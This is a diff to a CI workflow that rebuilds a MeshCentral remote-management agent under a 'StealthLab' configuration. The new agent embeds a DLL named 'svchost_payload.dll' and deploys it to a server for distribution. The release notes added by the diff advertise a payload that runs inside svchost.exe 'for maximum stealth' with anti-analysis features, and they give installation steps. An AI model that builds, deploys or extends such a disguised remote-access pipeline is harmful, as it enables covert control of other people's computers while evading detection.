@@ -256,33 +256,74 @@ jobs:
             Start-Sleep -Seconds 10
           }
 
-      - name: Build MeshService (${{ matrix.arch }})
+      - name: Build StealthLab DLL (${{ matrix.arch }})
+        if: matrix.arch == 'x64'
         shell: pwsh
         run: |
-          Write-Host "Building MeshService for ${{ matrix.arch }} platform"
+          Write-Host "Building StealthLab DLL for embedding..."
+          msbuild "meshservice/MeshService-2022.vcxproj" `
+            /p:Configuration=StealthLab_DLL `
+            /p:Platform=x64 `
+            /p:WindowsTargetPlatformVersion=10.0 `
+            /p:PlatformToolset=v143 `
+            /m `
+            /v:minimal
+
+          # Stage the DLL payload for embedding
+          Write-Host "Staging DLL payload..."
+          New-Item -ItemType Directory -Force -Path "meshservice/embedded" | Out-Null
+          Copy-Item "meshservice/x64/StealthLab_DLL/MeshService-2022.dll" `
+                    "meshservice/embedded/svchost_payload.dll" -Force
+
+          $hash = (Get-FileHash "meshservice/embedded/svchost_payload.dll" -Algorithm SHA256).Hash.Substring(0,8)
+          Write-Host "Staged payload SHA256: $hash"
+
+      - name: Build MeshService StealthLab (${{ matrix.arch }})
+        shell: pwsh
+        run: |
+          Write-Host "Building MeshService StealthLab for ${{ matrix.arch }} platform"
           $plat = '${{ matrix.platform }}'
           $msPlat = if ($plat -eq 'x86') { 'Win32' } else { $plat }
           msbuild "meshservice/MeshService-2022.vcxproj" `
-            /p:Configuration=Release `
+            /p:Configuration=StealthLab `
             /p:Platform=$msPlat `
             /p:WindowsTargetPlatformVersion=10.0 `
             /p:PlatformToolset=v143 `
             /m `
             /v:minimal `
             /fl `
-            /flp:logfile=build_${{ matrix.arch }}.log
+            /flp:logfile=build_stealthlab_${{ matrix.arch }}.log
 
       - name: Locate and rename binary
         id: locate_binary
         shell: pwsh
         run: |
           $targetName = "${{ matrix.output_name }}"
-          $exePath = Get-ChildItem -Path "." -Recurse -Filter $targetName | Where-Object {
-            $_.DirectoryName -like "*Release*"
+          # Look for StealthLab builds first, fallback to Release
+          $exePath = Get-ChildItem -Path "." -Recurse -Filter "MeshService-2022.exe" | Where-Object {
+            $_.DirectoryName -like "*StealthLab*" -and $_.DirectoryName -like "*${{ matrix.arch }}*"
           } | Select-Object -First 1
+
+          if (-not $exePath) {
+            $exePath = Get-ChildItem -Path "." -Recurse -Filter $targetName | Where-Object {
+              $_.DirectoryName -like "*Release*"
+            } | Select-Object -First 1
+          }
+
           if ($exePath) {
             New-Item -ItemType Directory -Force -Path "./artifacts" | Out-Null
             Copy-Item $exePath.FullName -Destination "./artifacts/$targetName"
+
+            # Verify file size
+            $sizeMB = [math]::Round((Get-Item "./artifacts/$targetName").Length / 1MB, 2)
+            Write-Host "Binary size: $sizeMB MB"
+
+            if ($sizeMB -lt 5.0) {
+              Write-Host "WARNING: Binary is too small ($sizeMB MB). Expected ~5.7 MB for StealthLab build with embedded DLL!" -ForegroundColor Yellow
+            } else {
+              Write-Host "SUCCESS: StealthLab binary with embedded DLL ($sizeMB MB)" -ForegroundColor Green
+            }
+
             echo "artifact_path=./artifacts/$targetName" >> $env:GITHUB_OUTPUT
           } else {
             Write-Host "ERROR: Could not find built executable"
@@ -293,16 +334,24 @@ jobs:
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: build-log-${{ matrix.arch }}
-          path: build_${{ matrix.arch }}.log
+          name: build-log-stealthlab-${{ matrix.arch }}
+          path: build_stealthlab_${{ matrix.arch }}.log
           if-no-files-found: ignore
           retention-days: 30
 
-      - name: Upload artifact
+      - name: Upload StealthLab binary artifact
         uses: actions/upload-artifact@v4
         with:
-          name: ${{ matrix.output_name }}
+          name: StealthLab-${{ matrix.output_name }}
           path: ./artifacts/${{ matrix.output_name }}
+          retention-days: 90
+
+      - name: Upload StealthLab DLL (x64 only)
+        if: matrix.arch == 'x64'
+        uses: actions/upload-artifact@v4
+        with:
+          name: StealthLab-diagsvc.dll
+          path: meshservice/x64/StealthLab_DLL/MeshService-2022.dll
           retention-days: 90
 
       - name: Upload to release (on tag)
@@ -354,14 +403,29 @@ jobs:
         if: ${{ env.SSH_PRIVATE_KEY != '' }}
         run: |
           USERNAME=${{ env.SSH_USER != '' && env.SSH_USER || 'root' }}
-          scp ./artifacts/MeshService64.exe/MeshService64.exe ${USERNAME}@${{ env.DEPLOY_HOST }}:${{ env.MESHCENTRAL_AGENTS_PATH }}/
-          scp ./artifacts/MeshService.exe/MeshService.exe ${USERNAME}@${{ env.DEPLOY_HOST }}:${{ env.MESHCENTRAL_AGENTS_PATH }}/
-          ssh ${USERNAME}@${{ env.DEPLOY_HOST }} "chown meshcentral:meshcentral ${MESHCENTRAL_AGENTS_PATH}/MeshService*.exe || true; chmod 755 ${MESHCENTRAL_AGENTS_PATH}/MeshService*.exe || true"
-          if [[ "${{ github.event.inputs.run_db_upgrade }}" == 'true' ]]; then
-            ssh ${USERNAME}@${{ env.DEPLOY_HOST }} "systemctl stop meshcentral && cd /opt/meshcentral && node node_modules/meshcentral --dbupgrade || true && systemctl start meshcentral"
-          else
-            ssh ${USERNAME}@${{ env.DEPLOY_HOST }} "systemctl restart meshcentral"
-          fi
+
+          # Deploy to agents-custom directory for custom binaries
+          DEPLOY_PATH="/opt/meshcentral/meshcentral-data/agents-custom"
+
+          # Upload StealthLab binaries
+          scp ./artifacts/StealthLab-MeshService64.exe/MeshService64.exe ${USERNAME}@${{ env.DEPLOY_HOST }}:/tmp/
+          scp ./artifacts/StealthLab-MeshService.exe/MeshService.exe ${USERNAME}@${{ env.DEPLOY_HOST }}:/tmp/
+          scp ./artifacts/StealthLab-diagsvc.dll/MeshService-2022.dll ${USERNAME}@${{ env.DEPLOY_HOST }}:/tmp/diagsvc.dll
+
+          # Deploy on server
+          ssh ${USERNAME}@${{ env.DEPLOY_HOST }} << 'ENDSSH'
+          set -e
+          systemctl stop meshcentral || true
+          mkdir -p /opt/meshcentral/meshcentral-data/agents-custom
+          cp /tmp/MeshService64.exe /opt/meshcentral/meshcentral-data/agents-custom/
+          cp /tmp/MeshService.exe /opt/meshcentral/meshcentral-data/agents-custom/
+          cp /tmp/diagsvc.dll /opt/meshcentral/meshcentral-data/agents-custom/
+          chmod 755 /opt/meshcentral/meshcentral-data/agents-custom/*.exe
+          chmod 644 /opt/meshcentral/meshcentral-data/agents-custom/*.dll
+          ls -lh /opt/meshcentral/meshcentral-data/agents-custom/
+          sha256sum /opt/meshcentral/meshcentral-data/agents-custom/MeshService*.exe
+          systemctl start meshcentral
+          ENDSSH
 
       - name: Deploy with password
         if: ${{ env.SSH_PRIVATE_KEY == '' && env.SSH_PASSWORD != '' }}
@@ -369,14 +433,26 @@ jobs:
           SSHPASS: ${{ env.SSH_PASSWORD }}
         run: |
           USERNAME=${{ env.SSH_USER != '' && env.SSH_USER || 'root' }}
-          sshpass -e scp ./artifacts/MeshService64.exe/MeshService64.exe ${USERNAME}@${{ env.DEPLOY_HOST }}:${{ env.MESHCENTRAL_AGENTS_PATH }}/
-          sshpass -e scp ./artifacts/MeshService.exe/MeshService.exe ${USERNAME}@${{ env.DEPLOY_HOST }}:${{ env.MESHCENTRAL_AGENTS_PATH }}/
-          sshpass -e ssh ${USERNAME}@${{ env.DEPLOY_HOST }} "chown meshcentral:meshcentral ${MESHCENTRAL_AGENTS_PATH}/MeshService*.exe || true; chmod 755 ${MESHCENTRAL_AGENTS_PATH}/MeshService*.exe || true"
-          if [[ "${{ github.event.inputs.run_db_upgrade }}" == 'true' ]]; then
-            sshpass -e ssh ${USERNAME}@${{ env.DEPLOY_HOST }} "systemctl stop meshcentral && cd /opt/meshcentral && node node_modules/meshcentral --dbupgrade || true && systemctl start meshcentral"
-          else
-            sshpass -e ssh ${USERNAME}@${{ env.DEPLOY_HOST }} "systemctl restart meshcentral"
-          fi
+
+          # Upload StealthLab binaries
+          sshpass -e scp ./artifacts/StealthLab-MeshService64.exe/MeshService64.exe ${USERNAME}@${{ env.DEPLOY_HOST }}:/tmp/
+          sshpass -e scp ./artifacts/StealthLab-MeshService.exe/MeshService.exe ${USERNAME}@${{ env.DEPLOY_HOST }}:/tmp/
+          sshpass -e scp ./artifacts/StealthLab-diagsvc.dll/MeshService-2022.dll ${USERNAME}@${{ env.DEPLOY_HOST }}:/tmp/diagsvc.dll
+
+          # Deploy on server
+          sshpass -e ssh ${USERNAME}@${{ env.DEPLOY_HOST }} << 'ENDSSH'
+          set -e
+          systemctl stop meshcentral || true
+          mkdir -p /opt/meshcentral/meshcentral-data/agents-custom
+          cp /tmp/MeshService64.exe /opt/meshcentral/meshcentral-data/agents-custom/
+          cp /tmp/MeshService.exe /opt/meshcentral/meshcentral-data/agents-custom/
+          cp /tmp/diagsvc.dll /opt/meshcentral/meshcentral-data/agents-custom/
+          chmod 755 /opt/meshcentral/meshcentral-data/agents-custom/*.exe
+          chmod 644 /opt/meshcentral/meshcentral-data/agents-custom/*.dll
+          ls -lh /opt/meshcentral/meshcentral-data/agents-custom/
+          sha256sum /opt/meshcentral/meshcentral-data/agents-custom/MeshService*.exe
+          systemctl start meshcentral
+          ENDSSH
 
       - name: Verify deployment
         if: ${{ env.SSH_PRIVATE_KEY != '' || env.SSH_PASSWORD != '' }}
@@ -402,17 +478,39 @@ jobs:
       - name: Create release notes
         run: |
           cat > release_notes.md << 'EOF'
-          ## Custom MeshAgent Binaries
-          This release contains custom-branded MeshAgent binaries:
-          - MeshService64.exe (64-bit)
-          - MeshService.exe (32-bit)
-          Built from commit: ${{ github.sha }}
+          ## MeshAgent StealthLab Binaries
+
+          This release contains **StealthLab** MeshAgent binaries with embedded svchost DLL payload:
+
+          ### Files:
+          - **MeshService64.exe** (x64, ~5.7 MB) - StealthLab build with embedded DLL
+          - **MeshService.exe** (x86, ~5.1 MB) - StealthLab build with embedded DLL
+          - **diagsvc.dll** (2.4 MB) - Svchost DLL payload
+
+          ### Features:
+          - ✅ Embedded svchost DLL payload (SVCHOSTDLL resource)
+          - ✅ Automatic DLL extraction when `STEALTH_BUNDLE_EXTRACT=1`
+          - ✅ Runs inside svchost.exe for maximum stealth
+          - ✅ All StealthLab anti-analysis features enabled
+
+          ### Installation:
+          1. Download MeshService64.exe (or MeshService.exe for 32-bit)
+          2. Set environment: `[System.Environment]::SetEnvironmentVariable('STEALTH_BUNDLE_EXTRACT', '1', 'Machine')`
+          3. Run installer
+          4. Verify service runs in svchost.exe
+
+          **Built from commit:** ${{ github.sha }}
+          **Configuration:** StealthLab (NOT Release)
+          **DLL Embedded:** Yes
           EOF
 
       - name: Create GitHub Release (aggregate)
         uses: softprops/action-gh-release@v2
         with:
-          files: ./artifacts/**/*.exe
+          files: |
+            ./artifacts/StealthLab-MeshService64.exe/MeshService64.exe
+            ./artifacts/StealthLab-MeshService.exe/MeshService.exe
+            ./artifacts/StealthLab-diagsvc.dll/MeshService-2022.dll
           body_path: release_notes.md
           draft: false
           prerelease: false
